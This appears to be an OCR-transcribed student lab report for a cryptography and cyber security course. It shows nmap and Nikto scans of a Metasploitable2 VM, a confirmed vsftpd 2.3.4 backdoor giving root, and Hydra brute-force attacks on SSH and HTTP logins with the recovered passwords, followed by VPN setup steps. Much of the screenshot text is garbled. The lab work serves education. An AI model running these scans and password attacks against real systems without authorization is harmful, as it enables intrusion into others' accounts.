Ly$ ( kattenmap -Okald)-(-)1@.126.134.18<br>Starting map 7.99 ( https: //mmap.org ) at 2826-@9-@5 81:40 +8538<br>Nmap Scan report for 1@.126.134.18<br>Host is up (8.88128 Latency).<br>Not show: 977 closed tcp ports (reset)<br>PORT STATE SERVICE<br>2i/tcp open ftp<br>22/tep pen ssh<br>23/tcp open telnet<br>25/tcp open smtp<br>53/tcp open domain<br>ee/tcp open http<br>11i/tep open rpcbind<br>139/tcp open netbias-ssn<br>445/tcp open microsoft-ds<br>512/tcp open exec<br>513/tcp open login<br>S1é/tcp open shell<br>1099/tcp open rmiregistry<br>1524/tcp open ingreslock<br>2849/tcp open nfs<br>2121/tcp open ccproxy-ftp<br>33a6/tcp apen mysql<br>5432/tcp open postgresql<br>§98@/tcp open vnc<br>68eG/tcp open X12<br>6667/tcp open irc<br>seag/tcp apen ajp13<br>B18@/tcp open unknown<br>WAC Address: @8:0C:29:9@:33:1A (Viware)<br>Device type: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o: Linux: Linux_kernel:2.6<br>OS details: Linux 2.6.9 - 2.6.33<br>Network Distance: 1 hop<br>0S detection performed. Please report any incorrect results at https://owap.org/subait/ .<br>Nmap done: 1 IP address (1 host up) scanned in 3.75 seconds<br><!-- End of picture text -->

 `nmap -A 10.126.134.18` 



<!-- Start of picture text -->
<br><!-- End of picture text -->

 ┌──(kali㉿ & kali)-[~] └─$ `nmap -A 10.126.134.18 Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 01:42 +0530 Nmap scan report for 10.126.134.18 Host is up (0.00074s latency). Not shown: 977 closed tcp ports (reset) PORT     STATE SERVICE     VERSION 21/tcp   open  ftp         vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |   STAT: | FTP server status:` 

```
|      Connected to 10.126.134.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol
2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE
10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu804-
base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is
no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2026-09-04T20:12:45+00:00; +3s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
```

```
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34581/tcp   mountd
|   100005  1,2,3      60915/udp   mountd
|   100021  1,3,4      44549/udp   nlockmgr
|   100021  1,3,4      54707/tcp   nlockmgr
|   100024  1          37886/tcp   status
|_  100024  1          56419/udp   status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup:
WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
```

```
|   Capabilities flags: 43564
```

```
|   Some Capabilities: ConnectWithDatabase, Support41Auth,
LongColumnFlag, SupportsCompression, SupportsTransactions,
SwitchToSSLAfterHandshake, Speaks41ProtocolNew
|   Status: Autocommit
|_  Salt: b+K{H5nO|G*;,gFeM1J_
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-09-04T20:12:45+00:00; +3s from scanner time.
```

```
| ssl-cert: Subject: commonName=ubuntu804-
base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is
no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp open  vnc         VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_    VNC Authentication (2)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
| irc-info:
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
|   uptime: 0 days, 0:11:02
|   source ident: nmap
|   source host: 69E2A66E.96DC2FF3.773B67D3.IP
|_  error: Closing Link: fftzmryuu[10.126.134.132] (Quit: fftzmryuu)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/5.5
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
MAC Address: 00:0C:29:90:33:1A (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain,
irc.Metasploitable.LAN; OSs: Unix, Linux; CPE:
cpe:/o:linux:linux_kernel
```



<!-- Start of picture text -->
<br><!-- End of picture text -->

 `nmap -sV -p0-5000 10.126.134.18` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
Lyi$ katt@nmap -s¥ald)-p@-5000-t~) 1.126.134.18<br>Starting Mmap 7.99 ( https: //nmap.org ) at 2826-99-05 81:44 +9598<br>Muap scan report for 18.126.134.18<br>Host is up (8.0038s Latency).<br>Wot shown: 4983 closed tcp ports (reset)<br>PORT STATE SERVICE VERSION<br>2i/tcp open ftp vsftpd 2.3.4<br>22/tcp apen ssh OpenSSH 4.7p1 Debian Subuntu1 (pratacal 2.8)<br>z3/ten open telnet Linux telnetd<br>25/tcp open sutp Postfix smtpd<br>53/tcp open domain TSC BINO 9.4.2<br>6e/tcp open http Apache httpd 2.2.8 ((ubuntu) OAV/2)<br>111/tep apen rpebind 2 (RPC 10RGea)<br>139/tcp open netbios-ssn Samba smbd 3.x - 4.x (workgroup: WORKGROUP)<br>445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>512/tcp open exec netkit-rsh rexecd<br>513/tcp open Login Open85D or Solaris rlogind<br>S1é/tep open tepwrapped<br>1099/tep open java-rmi GMU Classpath grairegistry<br>1524/tcp open bindshell Metasploitable root shell<br>2049/tcp open nfs 2-4 (RPC #100083)<br>2121/tcp open ftp ProFTPD 1.3.2<br>3386/tcp apen mysql MySQL S.@.51a-3ubuneus<br>3032/tep open distccd —_disteed vi ((Gau) 4.2.4 (ubuntu 4.2.4-1ubuntué))<br>MAC Address: @8:6C:29:90:33:1A (Viware)<br>Service Info: Host: metasploitable.localdomain; OSs: Unix, Limux; CPE: cpe:/o:Linux: lLinux_kernel<br>Service detection perfarned. Please repart any incorrect results at https: //nmap.org/submit/ .<br>Nuap done: 1 IP address (1 host up) scanned in 13.62 seconds<br><!-- End of picture text -->

### **Vulnerability Assessment** 

#### **Web Vulnerability Scanning (Nikto)** 



<!-- Start of picture text -->
+ [999967] Web Server returns a valid response with junk HTTP methods which may cause false positives.<br>+ [013587] Suggeste ecurity header missing ontent-security-policy. See ttps developer.mozilla.org/en-US/d<br>eb/HTTP/Headers/Permissions-Policy<br>-php-easter-egg,+ [001386 = PHPE9S68F34-D428-11d2-A769-@@AAOG1ACF42: PHP Easter Egg revea . potentially sensitive information via<br>+ (001 >= PHPE9S68F35-D428-11d2-A769-O0AAOO1ACF42: PHP Easter Egg reveals potentially sensitive information via<br>+ [001795] /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or Limited<br>+ [999984] /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, in<br>de: 9246: size: 40540, mtime: Tue De ] 54:00 2008 ee: http: avd. st.gov/vuln/detail/CVE-2003-1418<br>+ [001796] /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited t<br><!-- End of picture text -->

#### **Nmap NSE Script Vulnerability Scanning** 

- t ┌──(kali㉿ 6 kali)-[~] 

└─$ `nmap --script vuln -p0-1000 10.126.134.18 -T5 Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 01:50 +0530` 

```
Stats:0:01:09elapsed;0hostscompleted(1up),1undergoingScript
Scan
```

```
NSETiming:About97.99%done;ETC:01:51(0:00:01remaining)
Stats:0:03:23elapsed;0hostscompleted(1up),1undergoingScript
Scan
```

```
NSETiming:About99.73%done;ETC:01:53(0:00:01remaining)
Nmapscanreportfor10.126.134.18
Hostisup(0.00067slatency).
Notshown:989closedtcpports(reset)
PORTSTATESERVICE
21/tcpopenftp
|ftp-vsftpd-backdoor:
|VULNERABLE:
|vsFTPdversion2.3.4backdoor
|State:VULNERABLE(Exploitable)
|IDs:BID:48539CVE:CVE-2011-2523
|vsFTPdversion2.3.4backdoor,thiswasreportedon2011-07-
04.
|Disclosuredate:2011-07-03
|Exploitresults:
|Shellcommand:id
|Results:uid=0(root)gid=0(root)
|References:
|https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|https://www.securityfocus.com/bid/48539
|https://github.com/rapid7/metasploit-
framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-
download-backdoored.html
22/tcpopenssh
23/tcpopentelnet
25/tcpopensmtp
|_sslv2-drown:ERROR:Scriptexecutionfailed(use-dtodebug)
|ssl-poodle:
|VULNERABLE:
|SSLPOODLEinformationleak
|State:VULNERABLE
|IDs:BID:70574CVE:CVE-2014-3566
```

- `| The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a` 

```
|padding-oracleattack,akathe"POODLE"issue.
|Disclosuredate:2014-10-14
|Checkresults:
|TLS_RSA_WITH_AES_128_CBC_SHA
|References:
|https://www.securityfocus.com/bid/70574
|https://www.openssl.org/~bodo/ssl-poodle.pdf
|https://www.imperialviolet.org/2014/10/14/poodle.html
|_https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|ssl-dh-params:
|VULNERABLE:
|AnonymousDiffie-HellmanKeyExchangeMitMVulnerability
|State:VULNERABLE
|TransportLayerSecurity(TLS)servicesthatuseanonymous
|Diffie-Hellmankeyexchangeonlyprovideprotectionagainst
passive
|eavesdropping,andarevulnerabletoactiveman-in-the-middle
attacks
|whichcouldcompletelycompromisetheconfidentialityand
integrity
|ofanydataexchangedovertheresultingsession.
|Checkresults:
|ANONYMOUSDHGROUP1
|CipherSuite:TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
|ModulusType:Safeprime
|ModulusSource:postfixbuiltin
|ModulusLength:1024
|GeneratorLength:8
|PublicKeyLength:1024
|References:
|https://www.ietf.org/rfc/rfc2246.txt
|
```

```
|TransportLayerSecurity(TLS)ProtocolDHE_EXPORTCiphers
DowngradeMitM(Logjam)
|State:VULNERABLE
|IDs:BID:74733CVE:CVE-2015-4000
```

- `| The Transport Layer Security (TLS) protocol contains a flaw that is | triggered when handling Diffie-Hellman key exchanges defined with | the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker | to downgrade the security of a TLS session to 512-bit exportgrade | cryptography, which is significantly weaker, allowing the attacker | to more easily break the encryption and monitor or tamper with | the encrypted stream.` 

- `| Disclosure date: 2015-5-19` 

- `| Check results:` 

- `| EXPORT-GRADE DH GROUP 1` 

- `| Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA` 

- `| Modulus Type: Safe prime` 

- `| Modulus Source: Unknown/Custom-generated` 

- `| Modulus Length: 512` 

- `| Generator Length: 8` 

- `| Public Key Length: 512` 

- `| References:` 

- `| https://weakdh.org` 

- `| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000 | https://www.securityfocus.com/bid/74733 |` 

- `| Diffie-Hellman Key Exchange Insufficient Group Strength | State: VULNERABLE` 

- `| Transport Layer Security (TLS) services that use DiffieHellman groups` 

- `| of insufficient strength, especially those using one of a few commonly` 

- `| shared groups, may be susceptible to passive eavesdropping attacks.` 

```
|Checkresults:
|WEAKDHGROUP1
|CipherSuite:TLS_DHE_RSA_WITH_AES_256_CBC_SHA
|ModulusType:Safeprime
|ModulusSource:postfixbuiltin
|ModulusLength:1024
|GeneratorLength:8
|PublicKeyLength:1024
|References:
|_https://weakdh.org
|smtp-vuln-cve2010-4344:
|_TheSMTPserverisnotExim:NOTVULNERABLE
53/tcpopendomain
80/tcpopenhttp
|_http-trace:TRACEisenabled
|http-fileupload-exploiter:
```

```
|
```

```
|_Couldn'tfindafile-typefield.
|_http-sql-injection:ERROR:Scriptexecutionfailed(use-dtodebug)
|_http-stored-xss:Couldn'tfindanystoredXSSvulnerabilities.
|http-csrf:
```

```
|Spideringlimitedto:maxdepth=3;maxpagecount=20;
withinhost=10.126.134.18
```

```
|FoundthefollowingpossibleCSRFvulnerabilities:
|
```

```
|Path:http://10.126.134.18:80/dvwa/
```

```
|Formid:
|Formaction:login.php
|
|Path:http://10.126.134.18:80/twiki/TWikiDocumentation.html10.126.134.18:80/twiki/TWikiDocumentation.html.126.134.18:80/twiki/TWikiDocumentation.html126.134.18:80/twiki/TWikiDocumentation.html.134.18:80/twiki/TWikiDocumentation.html134.18:80/twiki/TWikiDocumentation.html.18:80/twiki/TWikiDocumentation.html18:80/twiki/TWikiDocumentation.html:80/twiki/TWikiDocumentation.html80/twiki/TWikiDocumentation.html/twiki/TWikiDocumentation.html
|Formid:
|Formaction:http://TWiki.org/cgi-bin/passwd/TWiki/WebHome
|
|Path:http://10.126.134.18:80/twiki/TWikiDocumentation.html10.126.134.18:80/twiki/TWikiDocumentation.html.126.134.18:80/twiki/TWikiDocumentation.html126.134.18:80/twiki/TWikiDocumentation.html.134.18:80/twiki/TWikiDocumentation.html134.18:80/twiki/TWikiDocumentation.html.18:80/twiki/TWikiDocumentation.html18:80/twiki/TWikiDocumentation.html:80/twiki/TWikiDocumentation.html80/twiki/TWikiDocumentation.html/twiki/TWikiDocumentation.html
|Formid:
|Formaction:http://TWiki.org/cgi-bin/passwd/Main/WebHome
|
```

```
|Path:http://10.126.134.18:80/twiki/TWikiDocumentation.html10.126.134.18:80/twiki/TWikiDocumentation.html.126.134.18:80/twiki/TWikiDocumentation.html126.134.18:80/twiki/TWikiDocumentation.html.134.18:80/twiki/TWikiDocumentation.html134.18:80/twiki/TWikiDocumentation.html.18:80/twiki/TWikiDocumentation.html18:80/twiki/TWikiDocumentation.html:80/twiki/TWikiDocumentation.html80/twiki/TWikiDocumentation.html/twiki/TWikiDocumentation.html
```

```
|Path:http://10.126.134.18:80/twiki/TWikiDocumentation.html10.126.134.18:80/twiki/TWikiDocumentation.html.126.134.18:80/twiki/TWikiDocumentation.html126.134.18:80/twiki/TWikiDocumentation.html.134.18:80/twiki/TWikiDocumentation.html134.18:80/twiki/TWikiDocumentation.html.18:80/twiki/TWikiDocumentation.html18:80/twiki/TWikiDocumentation.html:80/twiki/TWikiDocumentation.html80/twiki/TWikiDocumentation.html/twiki/TWikiDocumentation.html
```

```
|Path:http://10.126.134.18:80/twiki/TWikiDocumentation.html
```

- `| Form id:` 

- `| Form action: http://TWiki.org/cgi-bin/edit/TWiki/` 

```
|
```

- `| Path: http://10.126.134.18:80/twiki/TWikiDocumentation.html` 

- `| Form id:` 

- `| Form action: http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins |` 

- `| Path: http://10.126.134.18:80/twiki/TWikiDocumentation.html` 

- `| Form id:` 

- `| Form action: http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs |` 

- `| Path: http://10.126.134.18:80/dvwa/login.php` 

- `| Form id:` 

```
|_Formaction:login.php
```

- `| http-slowloris-check:` 

```
|VULNERABLE:
```

- `| Slowloris DOS attack` 

- `| State: LIKELY VULNERABLE` 

- `| IDs: CVE:CVE-2007-6750` 

- `| Slowloris tries to keep many connections to the target web server open and hold` 

- `| them open as long as possible. It accomplishes this by opening connections to` 

- `| the target web server and sending a partial request. By doing so, it starves` 

- `| the http server's resources causing Denial Of Service. |` 

- `| Disclosure date: 2009-09-17` 

- `| References:` 

```
|https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http://ha.ckers.org/slowloris/
```

```
|_http-vuln-cve2017-1001000:ERROR:Scriptexecutionfailed(use-dto
debug)
```

```
|_http-dombased-xss:Couldn'tfindanyDOMbasedXSS.
```

```
|http-enum:
```

- `| /tikiwiki/: Tikiwiki` 

- `| /test/: Test page` 

- `| /phpinfo.php: Possible information file` 

```
|/phpMyAdmin/:phpMyAdmin
```

```
|/doc/:Potentiallyinterestingdirectoryw/listingon
'apache/2.2.8 (ubuntu) dav/2'
```

```
|/icons/:Potentiallyinterestingfolderw/directorylisting
|_/index/:Potentiallyinterestingfolder
111/tcpopenrpcbind
139/tcpopennetbios-ssn
445/tcpopenmicrosoft-ds
512/tcpopenexec
513/tcpopenlogin
514/tcpopenshell
MACAddress:00:0C:29:90:33:1A(VMware)
```

####  **Searchsploit Vulnerability Lookup** 

- [ `searchsploit <service and version>` 



<!-- Start of picture text -->
 oO<br><!-- End of picture text -->



<!-- Start of picture text -->
Exploit Title Path<br>- Backdoor Command Execution (Metasploit) ix/remote/17491.rb<br>Shellcodes: No Result<br>Papers: No Results<br><!-- End of picture text -->

## **Assignment No 04** 

**Name:** Yash Ambadas Borude **PRN No:** UCS23M1020 **Roll No:** 20 **Class:** B.Tech Computer (A) **Subject:** Cryptography and Cyber Security 

### **Analyze Real-World Cyber Attacks and Security Weaknesses Applications (Password attack simulation using Hydra)** 

**Part 1: Cracking SSH Password** 

   1. **Start Matrix-1 Machine** 

      - a. IP Address: 10.126.134.108 

   2. **Start Kali Machine** 

      - a. IP Address: 10.126.134.132 

   3. **Scan Matrix-1 Machine using Kali Linux** 

      - a. Check whether the SSH service is running: 

- `nmap -sV -p 22 10.126.134.108` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
pause$ nmap -sV kall)-[~]-p 22 18.126.134.168<br>Starting Map 7.99 { https://nmap.crg ) at 2026-89-85 18:45 +8530<br>fmap scan report for 1@.126.134.108<br>Host is up (@.@8@26s Latency).<br>PORT STATE SERVICE VERSION<br>22/tcp open ssh OpenSSH 7.7 (protocol 2.8)<br>MAC Address: @@:60C:29:BC:90:EB (VMware)<br>:<br>! service detection performed. Please report any incorrect results at https://nmap.arg/submit/ -<br>fap done: 1 IP address {1 host up) scanned in 6.77 seconds<br><!-- End of picture text -->

   - b. Note: SSH port is open, so we can attempt a brute-force attack using Hydra. 

4. **Craft a custom wordlist** 

   - a. Create a wordlist containing probable passwords for the target SSH Server: 



<!-- Start of picture text -->
pytkatiewordlist.txt$ 1s wordlist. kali)-[+]txt<br>ce kali)-[-]<br>$ 1s -la wordlist.txt<br>-Ia-r—r— 1 root roat 799 Sep 5 @2:32 wordlise.txt<br>oy? kali)-[~]<br><!-- End of picture text -->



<!-- Start of picture text -->
[lta kat)<br>123456$ cat molediist. txt || head -n 10<br>12345<br>123456789<br>password<br>LLoveyou<br>princess<br>1234567<br>; rackyou<br>* 12945678<br>abe123<br><!-- End of picture text -->

      - b. Added 100 probable passwords into the wordlist file. 

   5. **Perform the attack using Hydra** 

      - a. Run Hydra to brute-force SSH credentials: 

- `hydra -L wordlist.txt -P wordlist.txt ssh://10.126.134.108:22` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
Lyteto$ hydra katt)-L wordlist.txt(9) -P wordList.txt ssh: //10.126.134.108:22<br>Hydra ¥9.7 (c} 2823 by van Hauser/THC @ David Maciejak - Please do not use in military or secret service organizatio<br>ns, or for illegal purposes (this 4s non-binding, these **% ignore laws and ethics anyway).<br>Hydra (https: //github.con/vanhauser-thc/the-hydra) starting at 2026-09-85 10:46:45<br>IWARMING] Many SSH configurations limit the number of parallel tasks, it is recomended to reduce the tasks: use -t<br>4<br>[WARNING] Restarefile (you have 16 seconds ta abort ... (use option -I ta skip maiting)) from a previous session foun<br>4, to prevent overuriting, ./hydra.restore<br>[OATA] max 16 tasks per 1 server, overall 16 tasks, 10816 login tries (1:184/p:104), ~676 tries per task<br>LOATA) attacking ssh: //10.126.134.108:22/<br>ren host: 160.126.134.198 login: guest password: killér7n<br><!-- End of picture text -->

###### 6. **Test the discovered credentials** 

   - a. Log in using SSH: 

- `ssh guest@10.126.134.108` 

   - b.  When prompted, enter the cracked password ( **k1ll0r7n** ). 



<!-- Start of picture text -->
p,fkatie$ ssh guest#i8.126.136.108kali)-[~]<br>++ WARNIMG: connection is not using a post-quantum key exchange algorithm.<br>sa This session may be vulnerable to “store now, decrypt later” attacks.<br>x The server may need to be upgraded. See https://openssh.com/pq.<br>guestH10.126.194.188's password: html<br>Last Login: Sat Sep 5 1@:42:@5 2826 from 18.126.134.132<br>guestqportaus:~$ whoani<br><!-- End of picture text -->

#### **Part 2: Cracking HTTP Login Password** 

7. **Brute-force HTTP Auth Login** 

a. Execute Hydra against the HTTP GET protected endpoint using rockyou.txt wordlist:  `hydra -l bob -P Downloads/wordlist/rockyou.txt 10.49.183.74 http-get /protected` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
Cte att)<br>$ hydra -l bob -P Downleads/wordlist/rockyou.txt 16.49.183.74 http-get /protected<br>Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret se<br>rviceanyway)organizations,- or for illegal purposes (this is non-binding, these s* ignore Laws and ethics<br>Hydra (https: //github. com/vanhauser-thc/thc-hydra) starting at 2026-84-02 06:58:42<br>(WARNING] Restorefile (you have 1® seconds to abort... (use option -I to skip waiting)) from a prev<br>fous session found, to prevent overwriting, ./hydra.restore<br>[OATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (1:1/p:14344399), ~896525<br>tries per task<br>[OATA) attacking http-get://10.49,183,74:86/protected<br>(0) (http-get] host: 18.49.183.74 login: bob password: bubbles<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https: //github.com/vanhauser-thc/thc-hydra) finished at 2026-84-@3 00:58:54<br><!-- End of picture text -->

## **Assignment No 05** 

|**Name:Borude Yash Ambadas**|**PRN No:UCS23M1020**|
|---|---|
|**Roll No:20**|**Class:B.Tech Computer (A)**|



**Subject: Cryptography and Cyber Security** 

### **Design and Implement Enterprise Network Security Controls: VPN Setup for Secure Remote Connection** 



<!-- Start of picture text -->
1. Launch Kali Linux<br><!-- End of picture text -->



<!-- Start of picture text -->
;<br>SS twy Mugu<br>2 HAW Eh<br><!-- End of picture text -->

###### **2. Update and upgrade the system** 

- **sudo apt update && sudo apt upgrade -y** 



<!-- Start of picture text -->
Sieme vt aE<br>Van W001) A000<br>om<br>‘Session Actions Edit View Help<br><!-- End of picture text -->

**3. Install Openvpn** 

>  **sudo apt install openvpn -y** 



<!-- Start of picture text -->
install openvpn<br>openvpn is already the newest version (2.7.8-1)<br>Summary:<br>Upgrading: ©, Installing: ©, Removing: 0, Not Upgrading:52<br><!-- End of picture text -->

###### **4. Verify Openvpn is available** 

 **sudo openvpn --version** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
penn 2.7.8 x86_64-pe-Linux-gnu {SSL (OpenSSL)] {120} [24] [EPOLL] [PKCSI1} [MH/PETINFO)[AEAD] [0Co<br>Copyright (C) 2002-2026 OpenvPn<br>Tent.salessnobie libtool tockeyes enable Lzdsyes enable. Lroryes enable_naintainerfodesno enable sanagenent=yes enaBle_ntin-yes enable. option checKing-no.enable-pandTopern enable, pecanticeno enable,<br>erablersmalions enable_statieoyes' enable aystenteyes enubie-onittesteeno enable serrot-oo enable Sintz dticyes enable wolfavoptions_fryes enable X20) At neernancyes Wii<br>| Inc <salesdopenvpn.net eras<br><!-- End of picture text -->

###### **5. Check IP Address** 

 **ip a** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
$ ipa<br>ig <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>Link/loopback brd<br>inet /& scope host lo<br>valid_lft forever preferred lft forever<br>inet6 ::1/128 scope host noprefixroute<br>valid_lft forever preferred_lft forever<br>2: <BROADCAST ,MULTICAST ,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>link/ether brd<br>inet /24 brd scope global dynamic noprefixroute ethd<br>valid_lft 1437sec preferred_lft 1437sec<br>inet6 /64 scope Link noprefixroute<br>valid lft forever preferred_lft forever<br>3: <NO-CARRIER,<br>Link/ether BROADCAST brd,MULTICAST,UP> mtu 1500 qdisc noqueue state group default qlen 0<br>inet 16 brd scope global dockerd<br>valid_lft forever preferred_lft forever<br><!-- End of picture text -->

**6. Download a openvpn config file : Filename.ovpn** 

###### **7. Connect the Vpn config** 

- **sudo openvpn vpnfilename.ovpn** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



###### **8. Check IP address again to verify the tunnel interface (tun0)** 



<!-- Start of picture text -->
a<br>u a<br>1: <LOOPBACK,<br>Link/Loopback UP, LOWER_UP> mtu 65536brd qdisc noqueue state UNKNOWN group default qlen 1000<br>inet 8 scope host lo<br>valid_lft forever preferred_lft forever<br>inet6 ::1/128 scope host noprefixroute<br>valid_lft forever preferred lft forever<br>78 <BROADCAST<br>Link/ether , MULTICAST, UP, brd LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>inet /24 brd scope global dynamic noprefixroute etho<br>valid_lft 1379sec preferred lft 1379sec<br>inet6 /64 scope link noprefixroute<br>valid_lft forever preferred_lft forever<br>33 <NO-CARRTER,<br>link/ether BROADCAST ,MULTICAST,UP>brd mtu 1500 qdisc noqueue state group default qlen 0<br>inet /16 brd scope global dockerd<br>valid_lft forever preferred_lft forever<br>4 <POINTOPOINT,<br>Link/none NOARP, UP, LOWER_UP> mtu 1380 qdisc noqueue state UP group default qlen 1000<br>inet /18 brd scope global tund<br>valid_lft forever preferred_lft forever<br>inet6 64 scope link stable-privacy proto kernel_lL<br>valid_lft forever preferred<br>lft forever<br><!-- End of picture text -->

**Note: The tun0 interface is visible, indicating the active VPN tunnel.** 

## **Assignment No 06** 

|**Name:Borude Yash Ambadas**|**PRN No:UCS23M1020**|
|---|---|
|**Roll No:20**|**Class:B.Tech Computer (A)**|



**Subject: Cryptography and Cyber Security** 

### **Perform Network Monitoring and Intrusion Detection: Detect Bruteforce Login Attempt Through Traffic Analysis** 

#### **1. Network Setup** 

   - **Windows (PowerShell):** 

- **ipconfig** 



<!-- Start of picture text -->
BE Windows Powershell x $v<br>Media State... ..... .. . : Media disconnected<br>Connection-specific DNS Suffix . :<br>Ethernet adapter VMware Network Adapter VMnet1:<br>Connection-specific DNS Suffix<br>Link-Local IPv6 Address . . . . . : fe80::10f2:eO4F:b898:91b9%6<br>IPvi Address. . . 5 192.168.116.1<br>Subnet Mask... 2... 255.255.255.0<br>Default Gateway... ......:<br>Ethernet adapter VMware Network Adapter VMnet8:<br>Connection-specific DNS Suffix<br>Link-Local IPv6 Address fe80: :771f :5e31:853e :5b2%15<br>IPvi Address... . .. . . . . . : 192.168.136.1<br>Subnet Mask 255.255.255.0<br>Default Gateway... ......<br>Wireless LAN adapter Wi-Fi<br>Connection-specific DNS Suffix . :<br>IPv6 Address 2409: 40c2: 8414: b3eb: cf75:1a99:6F26:9c2<br>Temporary IPv6 Address. . . : 209: 40c2: 8414: b3eb: ed8d: 3654: 46b3:13af<br>Link-Local IPv6 Address . . . . . : fe80::fef1:d874:719:507e%22<br>IPv4 Address 5 10.242.199.181<br>Subnet Mask... ....... . : 255.255.255.0<br>Default Gateway . . . 3 fe80::5cee:8FFF:Fe32:79c0%22<br>109.242.199.157<br>PS C:\Users\suraj><br><!-- End of picture text -->

   - **Note your VMnet/Host IPv4** 

- **Kali (Terminal):** 

>  **ip a** 

**ping -c 2 <Windows_IP>** 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
